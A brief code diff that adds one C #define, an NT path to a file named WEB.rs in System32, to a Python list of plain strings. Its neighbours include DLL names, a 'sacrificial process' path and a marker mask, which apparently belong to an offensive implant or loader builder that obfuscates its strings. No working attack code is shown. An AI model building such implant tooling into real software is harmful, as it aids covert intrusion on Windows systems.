@@ -66,6 +66,7 @@ plain_strings = [
     "#define S_ADVAPI32               \"advapi32.dll\"",
     "#define S_IPHLPAPI               \"iphlpapi.dll\"",
     "#define S_SACR_PROC              \"C:\\Windows\\System32\\print.exe\"",
+    "#define S_WEB_RS                 \"\\??\\C:\\Windows\\System32\\WEB.rs\"",
     "#define S_MARKER_MASK            \"xxxxxxxxxxxxxxxxxxxxxxxx\""
 
 ]
